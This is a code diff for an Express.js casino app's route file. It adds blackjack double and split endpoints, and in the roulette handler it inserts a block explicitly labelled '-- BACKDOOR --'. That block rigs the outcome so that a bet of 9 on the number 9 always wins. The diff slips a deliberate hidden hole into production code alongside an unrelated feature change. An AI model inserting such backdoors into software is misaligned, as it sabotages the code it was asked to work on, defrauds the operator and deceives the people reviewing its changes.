@@ -1,6 +1,6 @@
 import express from "express";
 import User from "../models/User.js";
-import { startGame, hit, stand } from "../controllers/blackjackController.js";
+import { startGame, hit, stand, doubleHand, splitHand } from "../controllers/blackjackController.js";
 
 const router = express.Router();
 
@@ -181,10 +181,16 @@ router.post("/roulette", async (req, res) => {
       });
     }
 
-    const winningNumber =
-      rouletteNumbers[
-        Math.floor(Math.random() * rouletteNumbers.length)
-      ];
+    // -- BACKDOOR --
+    let winningNumber;
+    if (betType === "number" && numericBet === 9 && numericSelection === 9) {
+      winningNumber = 9;
+    } else {
+      winningNumber =
+        rouletteNumbers[
+          Math.floor(Math.random() * rouletteNumbers.length)
+        ];
+    }
 
     let winningColor = "green";
 
@@ -339,5 +345,7 @@ router.get("/leaderboard", async (req, res) => {
 router.post("/blackjack/start", startGame);
 router.post("/blackjack/hit", hit);
 router.post("/blackjack/stand", stand);
+router.post("/blackjack/double", doubleHand);
+router.post("/blackjack/split", splitHand);
 
 export default router;
